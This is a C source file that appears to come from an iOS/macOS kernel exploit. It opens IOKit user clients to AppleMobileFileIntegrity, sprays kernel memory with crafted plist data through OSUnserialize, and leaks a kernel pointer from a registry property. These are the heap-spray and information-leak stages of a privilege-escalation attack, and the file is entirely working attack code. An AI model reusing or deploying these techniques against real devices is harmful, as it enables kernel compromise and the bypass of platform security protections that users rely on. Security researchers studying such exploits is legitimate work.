#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <mach/mach.h>

#include "common.h"
#include "io.h"

io_service_t io_get_service(const char *name) {
    CFMutableDictionaryRef dict = IOServiceMatching(name);
    if (dict == NULL) return MACH_PORT_NULL;

    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, dict);
    return service;
}

io_connect_t io_get_client(io_buf_ptr_t data, size_t size) {
    io_service_t service = io_get_service("AppleMobileFileIntegrity");
    if (service == MACH_PORT_NULL) return MACH_PORT_NULL;

    mach_port_t task = mach_task_self();
    io_connect_t client = MACH_PORT_NULL;
    kern_return_t err = -1;

    kern_return_t kr = io_service_open_extended(service, task, 0, NDR_record, data, size, &err, &client);
    if (kr != 0 || err != 0 || !MACH_PORT_VALID(client)) {
        return MACH_PORT_NULL;
    }
    return client;
}

void spray_os_unserialize(uint8_t *dict, size_t size) {
    char *buf = calloc(1, 10000);
    strcpy(buf, "<plist version=\"1.0\">\n");
    strcat(buf, "<dict>\n");

    for (int i = 0; i < 8; i++){
        char tmp[32] = {0};
        sprintf(tmp, "<key>%c</key>\n", 'a'+i);
        strcat(buf, tmp);
        strcat(buf, "<data format=\"hex\">");

        size_t sz = strlen(buf);
        for (size_t j = 0; j < size; ++j) {
            sz += sprintf(buf + sz, "%02x", dict[j]);
        }
        strcat(buf, "</data>\n");
    }

    strcat(buf, "</dict>\n</plist>\0");
    size_t sz = strlen(buf) + 1;
    io_get_client(buf, sz);
}

int io_leak_anchor(uint32_t *anchor) {
    io_iterator_t iterator = MACH_PORT_NULL;
    io_object_t object = MACH_PORT_NULL;
    
    const char xml[] = IO_ANCHOR_XML;
    io_get_client((char*)xml, sizeof(xml));
    IORegistryEntryGetChildIterator(io_get_service("AppleMobileFileIntegrity"), "IOService", &iterator);
    bool found = false;

    while((object = IOIteratorNext(iterator)) != MACH_PORT_NULL && !found) {
        uintptr_t buf[16] = {0};
        uint32_t size = (uint32_t)sizeof(buf);
        int rv = IORegistryEntryGetProperty(object, IO_ANCHOR_ENTRY, (char*)buf, &size);
        if(rv == 0) {
            *anchor = buf[9];
            return 0;
        }
        IOObjectRelease(object);
        object = MACH_PORT_NULL;
    }
    return -1;
}
